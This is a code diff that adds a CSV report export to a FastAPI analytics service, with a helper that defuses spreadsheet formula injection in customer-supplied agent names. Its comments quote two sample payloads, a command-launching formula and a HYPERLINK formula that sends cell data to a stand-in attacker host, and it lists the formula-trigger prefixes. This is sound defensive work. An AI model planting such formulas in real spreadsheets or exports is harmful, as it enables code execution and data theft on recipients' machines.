@@ -1,8 +1,12 @@
+import csv
+import io
 import logging
 import re
+from collections.abc import Iterator
 from datetime import UTC, datetime, timedelta
 
 from fastapi import APIRouter, Depends, HTTPException, Query
+from fastapi.responses import StreamingResponse
 from sqlalchemy import func, select
 
 from app.api.auth import get_current_client_or_operator
@@ -375,6 +379,105 @@ def get_per_bot_rollup_endpoint(
     except Exception as e:
         logger.error(f"Failed to fetch per-bot rollup: {e}")
         raise HTTPException(status_code=500, detail="Failed to load per-bot rollup.") from e
+
+
+# ─── Per-bot report CSV ──────────────────────────────────────────────────────
+
+_CSV_HEADER: tuple[str, ...] = ("Agent", "Conversations", "Leads", "Credits used")
+
+# Leading characters that make a spreadsheet treat a cell as a formula rather
+# than as text. ``=`` and ``@`` start a formula outright; ``+``/``-`` start a
+# signed expression; a leading TAB or CR is stripped by Excel before it makes
+# that decision, so ``\t=cmd|'/c calc'!A0`` slips a formula past a naive
+# first-character check. OWASP's CSV-injection list, in full.
+_CSV_FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value: str | None) -> str:
+    """Neutralise a spreadsheet formula hiding in a customer-controlled string.
+
+    Agent names are typed by the customer and land verbatim in a file that an
+    agency then forwards to *their* client, who opens it in Excel. An agent
+    named ``=HYPERLINK("https://evil.test/?"&A2,"Click")`` would execute on
+    open — data exfiltration on a machine that never touched OyeChats.
+
+    The fix is to stop the cell from ever *starting* with a formula trigger:
+    prefix it with a single quote, which every spreadsheet reads as "the rest
+    of this cell is literal text". The quote stays visible when a CSV is opened
+    directly (unlike a typed cell, where it is consumed as a formatting hint) —
+    a deliberate trade of cosmetics for not executing attacker input. Quoting
+    alone would not do: Excel evaluates ``"=1+1"`` just the same, so RFC-4180
+    escaping (which ``csv.writer`` already applies for delimiters, quotes and
+    newlines) is a separate concern from this one.
+
+    Only the agent name needs this. The other three columns are integers this
+    service computed, never strings a customer supplied.
+    """
+    text = "" if value is None else str(value)
+    return f"'{text}" if text.startswith(_CSV_FORMULA_PREFIXES) else text
+
+
+@router.get("/by-bot.csv")
+def get_per_bot_rollup_csv(
+    days: int = Query(30, ge=1, le=365, description="Trailing window of N days"),
+    auth: dict = Depends(get_current_client_or_operator),
+):
+    """The ``/analytics/by-bot`` rollup as a downloadable CSV.
+
+    Same window and same auth as the JSON endpoint — an agency owner pulls one
+    file per reporting period and forwards it to the client it covers, so the
+    filename carries the window (``oyechats-report-2026-07-14-to-2026-08-13.csv``)
+    and the rows arrive in the same order the dashboard shows them.
+
+    No totals row: a trailing aggregate in a CSV double-counts the moment
+    anyone pivots or concatenates it, and a bot legitimately named "Total"
+    would be indistinguishable from it. The dashboard renders the totals.
+    """
+    try:
+        until = datetime.now(UTC)
+        since = until - timedelta(days=days)
+        # Materialise before streaming: the response body is produced after
+        # this handler returns, by which point the session context manager has
+        # already closed. ``get_per_bot_rollup`` returns plain dicts, so there
+        # is nothing lazy left to resolve.
+        with get_session() as session:
+            rows = get_per_bot_rollup(session, client_id=auth["client_id"], since=since, until=until)
+
+        filename = f"oyechats-report-{since:%Y-%m-%d}-to-{until:%Y-%m-%d}.csv"
+
+        def stream_csv() -> Iterator[str]:
+            buffer = io.StringIO()
+            writer = csv.writer(buffer)
+
+            def flush() -> str:
+                chunk = buffer.getvalue()
+                buffer.seek(0)
+                buffer.truncate(0)
+                return chunk
+
+            writer.writerow(_CSV_HEADER)
+            yield flush()
+            for row in rows:
+                writer.writerow(
+                    [
+                        _csv_safe(row["bot_name"]),
+                        row["conversations"],
+                        row["leads"],
+                        row["credits_spent"],
+                    ]
+                )
+                yield flush()
+
+        return StreamingResponse(
+            stream_csv(),
+            media_type="text/csv",
+            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
+        )
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Failed to export per-bot rollup CSV: {e}")
+        raise HTTPException(status_code=500, detail="Failed to export the per-agent report.") from e
 
 
 # ─── Journeys view ───────────────────────────────────────────────────────────
